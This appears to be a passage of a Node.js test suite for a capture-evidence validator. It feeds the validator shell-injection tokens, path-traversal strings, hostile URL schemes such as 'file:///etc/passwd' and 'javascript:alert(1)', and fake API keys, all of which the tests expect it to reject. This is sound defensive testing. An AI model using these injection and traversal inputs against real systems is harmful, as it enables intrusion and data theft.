#!/usr/bin/env node
"use strict";

const assert = require("node:assert/strict");
const childProcess = require("node:child_process");
const fs = require("node:fs");
const http = require("node:http");
const path = require("node:path");
const {
  oracle, clone, tmpFixture, validSpec, validBundle, validFailure, refreshIntegrity, applicationState,
} = require("./helpers.js");

const tests = [];
function test(severity, group, name, fn) { tests.push({ severity, group, name, fn }); }
function codes(result) { return new Set((result.issues || []).map((entry) => entry.code)); }
function rejects(result, code) { assert.equal(result.ok, false, `expected rejection ${code}`); assert.ok(codes(result).has(code), `missing ${code}; got ${[...codes(result)].join(",")}`); }
function accepts(result) { assert.equal(result.ok, true, JSON.stringify(result.issues || [], null, 2)); }

const fx = tmpFixture();

for (const type of oracle.SOURCE_TYPES) {
  test("CRITICAL", "source-contract", `${type} valid reference evidence passes`, () => {
    const spec = validSpec(type, fx); accepts(oracle.validateCaptureSpec(spec, fx.context)); accepts(oracle.validateBundle(spec, validBundle(spec, fx), fx.context));
  });
}

const specMutations = [
  ["unknown schema", (s) => { s.schema = "vidtoolz.capture-spec.v2"; }, "CAPTURESPEC_SCHEMA_UNKNOWN", "CRITICAL"],
  ["unknown source type", (s) => { s.source = { type: "CAMERA" }; }, "SOURCE_TYPE_UNKNOWN", "CRITICAL"],
  ["missing evidence target", (s) => { delete s.evidence_target; }, "REQUIRED_FIELD_MISSING", "CRITICAL"],
  ["empty required facts", (s) => { s.evidence_target.required_facts = []; }, "EVIDENCE_TARGET_MISSING", "CRITICAL"],
  ["missing source identity", (s) => { delete s.source.expected_nonce; }, "REQUIRED_FIELD_MISSING", "CRITICAL"],
  ["unsupported capture mode", (s) => { s.capture.mode = "FOREVER_RECORDING"; }, "CAPTURE_MODE_UNSUPPORTED", "CRITICAL"],
  ["static with duration", (s) => { s.capture.duration_seconds = 1; }, "STATIC_DURATION_INVALID", "HIGH"],
  ["motion too short", (s) => { s.capture.mode = "SHORT_MOTION"; s.capture.duration_seconds = 0.1; }, "MOTION_DURATION_INVALID", "HIGH"],
  ["motion too long", (s) => { s.capture.mode = "SHORT_MOTION"; s.capture.duration_seconds = 3600; }, "MOTION_DURATION_INVALID", "CRITICAL"],
  ["unknown machine", (s) => { s.machine.id = "internet-host"; }, "MACHINE_UNKNOWN", "CRITICAL"],
  ["unbounded source action", (s) => { s.capture.action = "CLICK_ARBITRARY_CONTROLS"; }, "CAPTURE_ACTION_UNBOUNDED", "CRITICAL"],
  ["missing privacy policy", (s) => { delete s.privacy.policy_id; }, "REQUIRED_FIELD_MISSING", "CRITICAL"],
  ["secret policy redacts instead of blocks", (s) => { s.privacy.secret_response = "REDACT"; }, "SECRET_POLICY_UNSAFE", "CRITICAL"],
  ["unknown output root", (s) => { s.output.root_id = "anywhere"; }, "OUTPUT_ROOT_UNKNOWN", "CRITICAL"],
  ["relative traversal", (s) => { s.output.relative_dir = "../../../etc"; }, "OUTPUT_PATH_UNSAFE", "CRITICAL"],
  ["absolute output path", (s) => { s.output.relative_dir = "/tmp/export"; }, "OUTPUT_PATH_UNSAFE", "CRITICAL"],
  ["UNC output path", (s) => { s.output.relative_dir = "\\\\server\\share"; }, "OUTPUT_PATH_UNSAFE", "CRITICAL"],
  ["Windows drive traversal", (s) => { s.output.relative_dir = "C:\\Windows\\Temp"; }, "OUTPUT_PATH_UNSAFE", "CRITICAL"],
  ["unsafe raw filename", (s) => { s.output.raw_name = "raw;touch-owned.png"; }, "OUTPUT_NAME_UNSAFE", "CRITICAL"],
  ["missing action completion", (s) => { delete s.capture.action_completed_at; }, "REQUIRED_FIELD_MISSING", "HIGH"],
  ["unsafe mobile dimensions", (s) => { s.presentation.width = 1920; s.presentation.height = 1080; }, "PRESENTATION_GEOMETRY_INVALID", "HIGH"],
  ["tiny mobile text", (s) => { s.presentation.minimum_text_px = 12; }, "TEXT_MINIMUM_UNREADABLE", "HIGH"],
  ["unsafe hidden fallback", (s) => { s.failure_policy.allow_representation_fallback = true; }, "HIDDEN_FALLBACK_FORBIDDEN", "CRITICAL"],
  ["unknown root field", (s) => { s.arbitrary = true; }, "UNKNOWN_FIELD", "HIGH"],
];
for (const [name, mutate, code, severity] of specMutations) test(severity, "capturespec", name, () => { const spec = validSpec("TERMINAL", fx); mutate(spec); rejects(oracle.validateCaptureSpec(spec, fx.context), code); });

const terminalTokens = [
  ["semicolon chaining", "nonce;touch-owned"], ["and chaining", "nonce&&touch-owned"], ["or chaining", "nonce||touch-owned"],
  ["pipe", "nonce|tee-owned"], ["subshell", "$(touch-owned)"], ["backticks", "`touch-owned`"],
  ["stdout redirect", "nonce>owned"], ["stdin redirect", "nonce<secret"], ["environment expansion", "$PRIVATE_TOKEN"],
  ["braced environment expansion", "${PRIVATE_TOKEN}"], ["glob expansion", "*.env"], ["question glob", "secret?.txt"],
  ["character glob", "secret[0].txt"], ["newline injection", "nonce\ntouch-owned"], ["carriage injection", "nonce\rtouch-owned"],
  ["PowerShell command separator", "nonce;New-Item-owned"], ["PowerShell env", "$env:PRIVATE_TOKEN"], ["cmd env", "%PRIVATE_TOKEN%"],
  ["caret escape", "nonce^&whoami"], ["hostile single quote", "nonce' --eval owned"], ["hostile double quote", "nonce\" --eval owned"],
];
for (const [name, token] of terminalTokens) test("CRITICAL", "terminal", name, () => {
  const spec = validSpec("TERMINAL", fx); spec.source.argv[1] = token; rejects(oracle.validateCaptureSpec(spec, fx.context), "TERMINAL_META_SYNTAX");
});

test("CRITICAL", "terminal", "arbitrary executable rejected", () => { const spec = validSpec("TERMINAL", fx); spec.source.executable = "curl"; rejects(oracle.validateCaptureSpec(spec, fx.context), "TERMINAL_EXECUTABLE_MISMATCH"); });
test("CRITICAL", "terminal", "unknown command template rejected", () => { const spec = validSpec("TERMINAL", fx); spec.source.template_id = "shell-anything"; rejects(oracle.validateCaptureSpec(spec, fx.context), "TERMINAL_TEMPLATE_UNKNOWN"); });
test("CRITICAL", "terminal", "allowlisted fixture template cannot swap executable script", () => { const spec = validSpec("TERMINAL", fx); spec.source.argv[0] = path.join(fx.cwd, "other.js"); rejects(oracle.validateCaptureSpec(spec, fx.context), "TERMINAL_FIXTURE_AUTHORITY_INVALID"); });
test("CRITICAL", "terminal", "cwd outside approved root rejected", () => { const spec = validSpec("TERMINAL", fx); spec.source.cwd = "/tmp"; rejects(oracle.validateCaptureSpec(spec, fx.context), "TERMINAL_CWD_UNSAFE"); });
test("CRITICAL", "terminal", "cwd symlink rejected", () => { const link = path.join(fx.terminalRoot, "link"); fs.symlinkSync(fx.cwd, link); const spec = validSpec("TERMINAL", fx); spec.source.cwd = link; rejects(oracle.validateCaptureSpec(spec, fx.context), "TERMINAL_CWD_INVALID"); });
test("CRITICAL", "terminal", "real structured process nonce is visibly and cryptographically bound", () => {
  const spec = validSpec("TERMINAL", fx); const executed = childProcess.spawnSync(spec.source.executable, spec.source.argv, { cwd: spec.source.cwd, encoding: "utf8", shell: false });
  assert.equal(executed.status, 0); assert.equal(executed.stdout.trim(), spec.source.expected_nonce);
  const bundle = validBundle(spec, fx); const hash = oracle.sha256Bytes(executed.stdout);
  bundle.source_snapshot.process_receipt.stdout_sha256 = hash; bundle.source_snapshot.raw_stdout_sha256 = hash; refreshIntegrity(spec, bundle);
  accepts(oracle.validateBundle(spec, bundle, fx.context));
});
test("CRITICAL", "terminal", "fake image containing nonce without process receipt rejected", () => { const spec = validSpec("TERMINAL", fx); const b = validBundle(spec, fx); delete b.source_snapshot.process_receipt; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "TERMINAL_PROCESS_PROVENANCE_INVALID"); });
test("HIGH", "terminal", "stale terminal frame rejected", () => { const spec = validSpec("TERMINAL", fx); const b = validBundle(spec, fx); b.source_snapshot.observed_at = "2026-09-04T09:59:00Z"; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "SOURCE_STATE_STALE"); });
test("CRITICAL", "terminal", "terminal capture from wrong cwd rejected", () => { const spec = validSpec("TERMINAL", fx); const b = validBundle(spec, fx); b.source_snapshot.process_receipt.cwd = fx.terminalRoot; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "TERMINAL_PROCESS_PROVENANCE_INVALID"); });
test("CRITICAL", "terminal", "generated terminal text without process stdout binding rejected", () => { const spec = validSpec("TERMINAL", fx); const b = validBundle(spec, fx); b.source_snapshot.raw_stdout_sha256 = "0".repeat(64); refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "TERMINAL_OUTPUT_DETACHED"); });

const hostileSchemes = ["file:///etc/passwd", "javascript:alert(1)", "data:text/html,secret", "chrome://settings", "about:blank"];
for (const url of hostileSchemes) test("CRITICAL", "browser", `hostile URL scheme ${url.split(":")[0]} rejected`, () => { const spec = validSpec("BROWSER", fx); spec.source.url = url; rejects(oracle.validateCaptureSpec(spec, fx.context), "BROWSER_SCHEME_FORBIDDEN"); });
test("CRITICAL", "browser", "localhost without fixture authority rejected", () => { const spec = validSpec("BROWSER", fx); spec.source.network_zone = "PUBLIC_WEB"; rejects(oracle.validateCaptureSpec(spec, fx.context), "BROWSER_LOOPBACK_NOT_AUTHORIZED"); });
test("CRITICAL", "browser", "localhost admin endpoint rejected", () => { const spec = validSpec("BROWSER", fx); spec.source.url = "http://127.0.0.1:18443/admin"; rejects(oracle.validateCaptureSpec(spec, fx.context), "BROWSER_ADMIN_ENDPOINT_FORBIDDEN"); });
test("CRITICAL", "browser", "localhost package-engine control endpoint rejected", () => { const spec = validSpec("BROWSER", fx); spec.source.url = "http://127.0.0.1:18443/api/package-engine"; rejects(oracle.validateCaptureSpec(spec, fx.context), "BROWSER_ADMIN_ENDPOINT_FORBIDDEN"); });
test("HIGH", "browser", "malformed selector rejected", () => { const spec = validSpec("BROWSER", fx); spec.source.selector = "#proof{background:url(javascript:x)}"; rejects(oracle.validateCaptureSpec(spec, fx.context), "BROWSER_SELECTOR_MALFORMED"); });
test("HIGH", "browser", "wrong final page rejected", () => { const spec = validSpec("BROWSER", fx); const b = validBundle(spec, fx); b.source_snapshot.final_url = "http://127.0.0.1:18443/wrong"; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "BROWSER_REDIRECT_UNEXPECTED"); });
test("HIGH", "browser", "explicit authorized redirect accepted", () => { const spec = validSpec("BROWSER", fx); spec.source.allow_redirects = ["http://127.0.0.1:18443/final"]; const b = validBundle(spec, fx); b.source_snapshot.final_url = spec.source.allow_redirects[0]; refreshIntegrity(spec, b); accepts(oracle.validateBundle(spec, b, fx.context)); });
test("HIGH", "browser", "selector mismatch rejected", () => { const spec = validSpec("BROWSER", fx); const b = validBundle(spec, fx); b.source_snapshot.selector.query = "#other"; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "BROWSER_TARGET_NOT_VISIBLE"); });
test("HIGH", "browser", "hidden selector rejected", () => { const spec = validSpec("BROWSER", fx); const b = validBundle(spec, fx); b.source_snapshot.selector.visible = false; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "BROWSER_TARGET_NOT_VISIBLE"); });
test("CRITICAL", "browser", "authentication requirement surfaced", () => { const spec = validSpec("BROWSER", fx); const b = validBundle(spec, fx); b.source_snapshot.auth_state = "AUTH_REQUIRED"; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "BROWSER_AUTH_REQUIRED"); });
test("HIGH", "browser", "cached stale page rejected", () => { const spec = validSpec("BROWSER", fx); const b = validBundle(spec, fx); b.source_snapshot.cache_state = "STALE"; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "STALE_CAPTURE_REUSED"); });
test("HIGH", "browser", "requested state nonce missing from pixels rejected", () => { const spec = validSpec("BROWSER", fx); const b = validBundle(spec, fx); b.raw.visible_tokens = []; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "BROWSER_STATE_NOT_PROVEN"); });
test("HIGH", "browser", "real headless Chrome captures deterministic current local page", async () => {
  const server = http.createServer((req, res) => { res.setHeader("Content-Type", "text/html"); res.end("<!doctype html><div id=proof>state-browser-local-live</div>"); });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  try {
    const port = server.address().port; const body = await new Promise((resolve, reject) => http.get(`http://127.0.0.1:${port}/proof`, (res) => { let text = ""; res.on("data", (c) => { text += c; }); res.on("end", () => resolve(text)); }).on("error", reject));
    assert.match(body, /state-browser-local-live/);
    const evidenceDir = process.env.SCREEN_CAPTURE_ORACLE_EVIDENCE_DIR || path.join(fx.root, "browser-proof"); fs.mkdirSync(evidenceDir, { recursive: true });
    const screenshot = path.join(evidenceDir, "browser-local-authentic.png"); const profile = path.join(fx.root, "chrome-profile");
    const chrome = await new Promise((resolve, reject) => childProcess.execFile("google-chrome", ["--headless=new", "--no-sandbox", "--disable-gpu", "--hide-scrollbars", "--window-size=1280,720", `--user-data-dir=${profile}`, `--screenshot=${screenshot}`, "--dump-dom", `http://127.0.0.1:${port}/proof`], { timeout: 30000, maxBuffer: 4 * 1024 * 1024 }, (error, stdout, stderr) => error ? reject(Object.assign(error, { stdout, stderr })) : resolve({ stdout, stderr })));
    assert.match(chrome.stdout, /state-browser-local-live/); const png = oracle.parsePng(screenshot); assert.equal(png.width, 1280); assert.equal(png.height, 720);
    const context = { ...fx.context, localFixturePorts: [port] }; const spec = validSpec("BROWSER", fx); spec.source.url = `http://127.0.0.1:${port}/proof`; spec.source.expected_state_nonce = "state-browser-local-live";
    const b = validBundle(spec, fx); refreshIntegrity(spec, b); accepts(oracle.validateBundle(spec, b, context));
  } finally { await new Promise((resolve) => server.close(resolve)); }
});

test("CRITICAL", "file-code", "file mutated after request is rejected", () => {
  const local = tmpFixture(); const spec = validSpec("FILE_OR_CODE", local); const b = validBundle(spec, local); fs.appendFileSync(local.sourceFile, "// changed\n"); rejects(oracle.validateBundle(spec, b, local.context), "GIT_REQUEST_STATE_STALE");
});
test("CRITICAL", "file-code", "wrong repository identity rejected", () => { const spec = validSpec("FILE_OR_CODE", fx); spec.source.repository_id = "repo-b"; rejects(oracle.validateCaptureSpec(spec, fx.context), "REPOSITORY_IDENTITY_INVALID"); });
test("CRITICAL", "file-code", "wrong repository root rejected", () => { const spec = validSpec("FILE_OR_CODE", fx); spec.source.repository_root = fx.sourceRoot; rejects(oracle.validateCaptureSpec(spec, fx.context), "REPOSITORY_IDENTITY_INVALID"); });
test("CRITICAL", "file-code", "path traversal rejected", () => { const spec = validSpec("FILE_OR_CODE", fx); spec.source.path = "../../secret"; rejects(oracle.validateCaptureSpec(spec, fx.context), "SOURCE_PATH_TRAVERSAL"); });
test("CRITICAL", "file-code", "absolute /proc source rejected", () => { const spec = validSpec("FILE_OR_CODE", fx); spec.source.path = "/proc/version"; rejects(oracle.validateCaptureSpec(spec, fx.context), "SOURCE_PATH_TRAVERSAL"); });
test("CRITICAL", "file-code", "symlink source rejected", () => { const link = path.join(fx.repoRoot, "link.js"); fs.symlinkSync(fx.sourceFile, link); const spec = validSpec("FILE_OR_CODE", fx); spec.source.path = "link.js"; spec.source.source_sha256 = oracle.sha256File(link); rejects(oracle.validateCaptureSpec(spec, fx.context), "SOURCE_FILE_INVALID"); });
test("CRITICAL", "file-code", "named pipe source rejected without reading it", () => { const fifo = path.join(fx.repoRoot, "evidence.pipe"); childProcess.execFileSync("mkfifo", [fifo]); const spec = validSpec("FILE_OR_CODE", fx); spec.source.path = "evidence.pipe"; rejects(oracle.validateCaptureSpec(spec, fx.context), "SOURCE_FILE_INVALID"); });
test("HIGH", "file-code", "invalid captured line range rejected", () => { const spec = validSpec("FILE_OR_CODE", fx); spec.source.line_end = 500; rejects(oracle.validateCaptureSpec(spec, fx.context), "FILE_RANGE_INVALID"); });
test("HIGH", "file-code", "hidden contradictory line rejected", () => { const spec = validSpec("FILE_OR_CODE", fx); const b = validBundle(spec, fx); b.source_snapshot.visible_line_numbers = [1, 2, 4]; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "FILE_CONTEXT_OMITTED"); });
test("CRITICAL", "file-code", "generated substitute text rejected", () => { const spec = validSpec("FILE_OR_CODE", fx); const b = validBundle(spec, fx); b.raw.visible_text = "const state = 'FAKE';"; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "FILE_RENDER_DETACHED"); });
test("CRITICAL", "file-code", "source hash mismatch rejected", () => { const spec = validSpec("FILE_OR_CODE", fx); const b = validBundle(spec, fx); b.source_snapshot.source_sha256 = "f".repeat(64); refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "FILE_SOURCE_HASH_MISMATCH"); });
test("HIGH", "file-code", "wrong branch rejected", () => { const spec = validSpec("FILE_OR_CODE", fx); const b = validBundle(spec, fx); b.source_snapshot.git_branch = "feature"; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "GIT_SOURCE_IDENTITY_MISMATCH"); });
test("HIGH", "file-code", "wrong HEAD rejected", () => { const spec = validSpec("FILE_OR_CODE", fx); const b = validBundle(spec, fx); b.source_snapshot.git_head = "2".repeat(40); refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "GIT_SOURCE_IDENTITY_MISMATCH"); });

function gitEvidenceFixture() {
  const local = tmpFixture(); const repo = path.join(local.terminalRoot, "git-repo"); fs.mkdirSync(repo);
  const git = (...args) => childProcess.execFileSync("git", ["-C", repo, ...args], { encoding: "utf8" });
  git("init", "-b", "nonce-authentic-001"); git("config", "user.email", "oracle@example.invalid"); git("config", "user.name", "Oracle Fixture");
  fs.writeFileSync(path.join(repo, "same.txt"), "repo-a\n"); git("add", "same.txt"); git("commit", "-m", "fixture");
  local.context.repositories["git-repo-a"] = { root: repo };
  const status = git("status", "--porcelain=v1", "--branch"); const head = git("rev-parse", "HEAD").trim(); const stateHash = oracle.sha256Bytes(status);
  const spec = validSpec("TERMINAL", local); Object.assign(spec.source, { template_id: "git-status", executable: "git", argv: ["status", "--porcelain=v1", "--branch"], cwd: repo, expected_nonce: "nonce-authentic-001", repository: { id: "git-repo-a", root: repo, head, branch: "nonce-authentic-001", worktree_state_sha256: stateHash } });
  const b = validBundle(spec, local); b.source_snapshot.process_receipt.argv = spec.source.argv; b.source_snapshot.process_receipt.cwd = repo; b.source_snapshot.process_receipt.template_id = "git-status"; b.source_snapshot.process_receipt.executable = "git"; b.source_snapshot.process_receipt.stdout_sha256 = stateHash; b.source_snapshot.raw_stdout_sha256 = stateHash; b.source_snapshot.git_state = clone(spec.source.repository); b.raw.visible_tokens = [spec.source.expected_nonce, "fact-current-state"]; b.presentation.visible_tokens = [...b.raw.visible_tokens]; refreshIntegrity(spec, b);
  return { local, repo, git, status, spec, b };
}
test("CRITICAL", "git", "real git status binds repo HEAD branch state and visible output", () => { const g = gitEvidenceFixture(); accepts(oracle.validateBundle(g.spec, g.b, g.local.context)); });
for (const [name, key, value] of [["wrong repo", "id", "git-repo-b"], ["wrong root", "root", "/tmp/other"], ["branch switched", "branch", "other"], ["HEAD changed", "head", "2".repeat(40)], ["dirty state changed", "worktree_state_sha256", "3".repeat(64)]]) {
  test("CRITICAL", "git", name, () => { const g = gitEvidenceFixture(); g.b.source_snapshot.git_state[key] = value; refreshIntegrity(g.spec, g.b); rejects(oracle.validateBundle(g.spec, g.b, g.local.context), "GIT_STATE_MISMATCH"); });
}
test("HIGH", "git", "detached HEAD is explicit and distinguishable", () => {
  const g = gitEvidenceFixture(); g.git("checkout", "--detach"); fs.writeFileSync(path.join(g.repo, "nonce-detached-001"), "current detached state\n");
  const status = g.git("status", "--porcelain=v1", "--branch"); const stateHash = oracle.sha256Bytes(status);
  g.spec.source.expected_nonce = "nonce-detached-001"; g.spec.source.repository.branch = "DETACHED"; g.spec.source.repository.worktree_state_sha256 = stateHash;
  g.b.source_snapshot.process_receipt.stdout_sha256 = stateHash; g.b.source_snapshot.raw_stdout_sha256 = stateHash; g.b.source_snapshot.git_state = clone(g.spec.source.repository);
  g.b.raw.visible_tokens = [g.spec.source.expected_nonce, "fact-current-state"]; g.b.presentation.visible_tokens = [...g.b.raw.visible_tokens]; refreshIntegrity(g.spec, g.b);
  accepts(oracle.validateBundle(g.spec, g.b, g.local.context));
});
test("CRITICAL", "git", "repository changed after request invalidates declared state", () => { const g = gitEvidenceFixture(); fs.writeFileSync(path.join(g.repo, "dirty.txt"), "changed\n"); rejects(oracle.validateCaptureSpec(g.spec, g.local.context), "GIT_REQUEST_STATE_STALE"); });
test("HIGH", "git", "stale previous git output rejected by state hash", () => { const g = gitEvidenceFixture(); g.b.source_snapshot.process_receipt.stdout_sha256 = "4".repeat(64); refreshIntegrity(g.spec, g.b); rejects(oracle.validateBundle(g.spec, g.b, g.local.context), "TERMINAL_OUTPUT_DETACHED"); });

const desktopCases = [
  ["wrong window title", (b) => { b.source_snapshot.application_state.window_title = "Other"; }, "APPLICATION_STATE_MISMATCH"],
  ["wrong application", (b) => { b.source_snapshot.application_state.application_id = "other-app"; }, "APPLICATION_STATE_MISMATCH"],
  ["obscured window", (b) => { b.source_snapshot.application_state.obscured_ratio = 0.5; }, "APPLICATION_NOT_VISIBLE"],
  ["minimized window", (b) => { b.source_snapshot.application_state.minimized = true; }, "APPLICATION_NOT_VISIBLE"],
  ["another session", (b) => { b.source_snapshot.application_state.session_id = "display-other"; }, "APPLICATION_STATE_MISMATCH"],
  ["application not ready", (b) => { b.source_snapshot.application_state.ready = false; }, "APPLICATION_NOT_READY"],
  ["modal dialog present", (b) => { b.source_snapshot.application_state.modal_present = true; }, "APPLICATION_NOT_READY"],
  ["focus mismatch", (b) => { b.source_snapshot.application_state.focused_window_id = "other"; }, "APPLICATION_NOT_READY"],
  ["recent human activity", (b) => { b.source_snapshot.application_state.human_activity_within_seconds = 2; }, "HUMAN_ACTIVITY_PRIORITY"],
];
for (const [name, mutate, code] of desktopCases) test(name === "recent human activity" ? "CRITICAL" : "HIGH", "desktop", name, () => { const spec = validSpec("DESKTOP_APPLICATION", fx); const b = validBundle(spec, fx); mutate(b); refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), code); });
test("CRITICAL", "desktop", "focus-stealing CaptureSpec rejected", () => { const spec = validSpec("DESKTOP_APPLICATION", fx); spec.source.allow_focus_change = true; rejects(oracle.validateCaptureSpec(spec, fx.context), "DESKTOP_MUTATION_FORBIDDEN"); });
test("HIGH", "desktop", "ambiguous application rejected", () => { const spec = validSpec("DESKTOP_APPLICATION", fx); spec.source.window_title = ""; rejects(oracle.validateCaptureSpec(spec, fx.context), "APPLICATION_IDENTITY_AMBIGUOUS"); });

const resolveCases = [
  ["Resolve not running", (s) => { s.process_running = false; }, "RESOLVE_NOT_RUNNING"],
  ["wrong project open", (s) => { s.project_id = "other-project"; }, "RESOLVE_PROJECT_MISMATCH"],
  ["wrong timeline open", (s) => { s.timeline_id = "other-timeline"; }, "RESOLVE_TIMELINE_MISMATCH"],
  ["wrong playhead", (s) => { s.playhead_frame = 121; }, "RESOLVE_PLAYHEAD_MISMATCH"],
  ["Resolve modal", (s) => { s.modal_present = true; }, "APPLICATION_NOT_READY"],
  ["Resolve human active", (s) => { s.human_activity_within_seconds = 1; }, "HUMAN_ACTIVITY_PRIORITY"],
  ["Resolve rendering", (s) => { s.rendering = true; }, "RESOLVE_BUSY"],
  ["Resolve playback active", (s) => { s.playing = true; }, "RESOLVE_BUSY"],
];
for (const [name, mutate, code] of resolveCases) test("CRITICAL", "resolve", name, () => { const spec = validSpec("DAVINCI_RESOLVE", fx); const b = validBundle(spec, fx); mutate(b.source_snapshot.application_state); refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), code); });
test("CRITICAL", "resolve", "Resolve editorial mutation rejected", () => { const spec = validSpec("DAVINCI_RESOLVE", fx); const b = validBundle(spec, fx); b.provenance.operations.push("SET_PLAYHEAD"); refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), "RESOLVE_MUTATION_FORBIDDEN"); });
test("CRITICAL", "resolve", "Resolve project/timeline/playhead required", () => { const spec = validSpec("DAVINCI_RESOLVE", fx); delete spec.source.timeline_id; rejects(oracle.validateCaptureSpec(spec, fx.context), "REQUIRED_FIELD_MISSING"); });

const syntheticSecrets = [
  "OPENAI_API_KEY=sk-test-1234567890ABCDEF", "AWS_SECRET_ACCESS_KEY=TEST_ONLY_NOT_REAL_123", "PRIVATE_TOKEN=VIDTOOLZ_TEST_SECRET_123", "PASSWORD=TEST_ONLY_PASSWORD", "-----BEGIN OPENSSH PRIVATE KEY-----",
];
for (const secret of syntheticSecrets) test("CRITICAL", "privacy", `synthetic ${secret.split(/[= ]/)[0]} detected`, () => assert.ok(oracle.scanSecrets(secret).length > 0));
for (const type of oracle.SOURCE_TYPES) test("CRITICAL", "privacy", `${type} secret-bearing evidence blocked`, () => { const spec = validSpec(type, fx); const b = validBundle(spec, fx); b.raw.visible_text += `\nPRIVATE_TOKEN=VIDTOOLZ_TEST_SECRET_${type}`; refreshIntegrity(spec, b); rejects(oracle.validateBundle(spec, b, fx.context), type === "TERMINAL" ? "SECRET_LEAK" : "PRIVACY_SCAN_NOT_CLEAR"); });

const bundleMutations = [
  ["wrong CaptureSpec digest", (s, b) => { b.spec_digest_sha256 = "0".repeat(64); }, "BUNDLE_SPEC_BINDING_INVALID", "CRITICAL"],
  ["wrong capture id", (s, b) => { b.capture_id = "capture-another-job"; }, "BUNDLE_SPEC_BINDING_INVALID", "CRITICAL"],
  ["stale filename reused", (s, b) => { b.source_snapshot.capture_id = "capture-previous-job"; refreshIntegrity(s, b); }, "STALE_CAPTURE_REUSED", "CRITICAL"],
  ["raw missing", (s, b) => { fs.unlinkSync(b.raw.path); }, "ARTIFACT_FILE_INVALID", "CRITICAL"],
  ["presentation missing", (s, b) => { fs.unlinkSync(b.presentation.path); }, "ARTIFACT_FILE_INVALID", "CRITICAL"],
  ["raw and presentation aliased", (s, b) => { b.presentation.path = b.raw.path; b.presentation.sha256 = b.raw.sha256; b.presentation.bytes = b.raw.bytes; }, "RAW_PRESENTATION_ALIAS", "CRITICAL"],
  ["raw bytes mutated", (s, b) => { fs.appendFileSync(b.raw.path, "tamper"); }, "ARTIFACT_SIZE_MISMATCH", "CRITICAL"],
  ["presentation bytes mutated", (s, b) => { fs.appendFileSync(b.presentation.path, "tamper"); }, "ARTIFACT_SIZE_MISMATCH", "CRITICAL"],
  ["provenance raw hash changed", (s, b) => { b.provenance.raw_sha256 = "1".repeat(64); }, "PROVENANCE_ARTIFACT_BINDING_INVALID", "CRITICAL"],
  ["provenance manifest changed", (s, b) => { b.provenance.adapter_version = "evil"; }, "PROVENANCE_MANIFEST_TAMPERED", "CRITICAL"],
  ["wrong machine provenance", (s, b) => { b.provenance.machine_id = "presto"; }, "PROVENANCE_SESSION_INVALID", "CRITICAL"],
  ["adapter self-QC", (s, b) => { b.qc.reviewer = b.adapter.id; refreshIntegrity(s, b); }, "INDEPENDENT_QC_INVALID", "CRITICAL"],
  ["QC not independent", (s, b) => { b.qc.independent_of_adapter = false; refreshIntegrity(s, b); }, "INDEPENDENT_QC_INVALID", "CRITICAL"],
  ["QC failed", (s, b) => { b.qc.verdict = "FAIL"; refreshIntegrity(s, b); }, "INDEPENDENT_QC_INVALID", "CRITICAL"],
  ["QC stale digest", (s, b) => { b.qc.bundle_digest_sha256 = "2".repeat(64); }, "INDEPENDENT_QC_INVALID", "CRITICAL"],
  ["technical capture without intent", (s, b) => { b.intent.evidence_state = "NOT_PROVEN"; refreshIntegrity(s, b); }, "EVIDENCE_INTENT_NOT_SATISFIED", "CRITICAL"],
  ["required fact absent", (s, b) => { b.intent.observed_facts = []; refreshIntegrity(s, b); }, "REQUIRED_FACT_UNPROVEN", "CRITICAL"],
  ["Episode Factory handoff absent", (s, b) => { b.handoff.state = "LOCAL_ONLY"; }, "EPISODE_FACTORY_HANDOFF_INVALID", "CRITICAL"],
  ["handoff digest stale", (s, b) => { b.handoff.evidence_digest_sha256 = "3".repeat(64); }, "HANDOFF_DIGEST_INVALID", "CRITICAL"],
];
for (const [name, mutate, code, severity] of bundleMutations) test(severity, "provenance", name, () => { const local = tmpFixture(); const spec = validSpec("BROWSER", local); const b = validBundle(spec, local); mutate(spec, b); rejects(oracle.validateBundle(spec, b, local.context), code); });

const transformCases = [
  ["crop removes contradictory context", (b) => { b.presentation.transformations[1].retained_context_ids = []; }, "CONTRADICTORY_CONTEXT_REMOVED", "CRITICAL"],
  ["zoom removes header context", (b) => { b.presentation.transformations[2].retained_context_ids = []; }, "CONTRADICTORY_CONTEXT_REMOVED", "CRITICAL"],
  ["zoom is excessive", (b) => { b.presentation.transformations[2].scale = 8; }, "ZOOM_UNBOUNDED", "HIGH"],
  ["callout covers evidence context", (b) => { b.presentation.transformations.push({ type: "CALLOUT", covers_context_ids: ["context-header"] }); }, "ANNOTATION_OBSCURES_EVIDENCE", "CRITICAL"],
  ["highlight covers evidence context", (b) => { b.presentation.transformations.push({ type: "HIGHLIGHT", covers_context_ids: ["context-header"] }); }, "ANNOTATION_OBSCURES_EVIDENCE", "HIGH"],
  ["retyping source is forbidden", (b) => { b.presentation.transformations.push({ type: "RETYPE" }); }, "SEMANTIC_TRANSFORM_FORBIDDEN", "CRITICAL"],
  ["redrawing source is forbidden", (b) => { b.presentation.transformations.push({ type: "REDRAW" }); }, "SEMANTIC_TRANSFORM_FORBIDDEN", "CRITICAL"],
  ["untraceable redaction", (b) => { b.presentation.transformations.push({ type: "REDACTION", region_ids: [] }); }, "REDACTION_UNTRACEABLE", "CRITICAL"],
  ["evidence outside safe area", (b) => { b.presentation.layout.evidence_box.x = 0; }, "EVIDENCE_OUTSIDE_SAFE_AREA", "HIGH"],
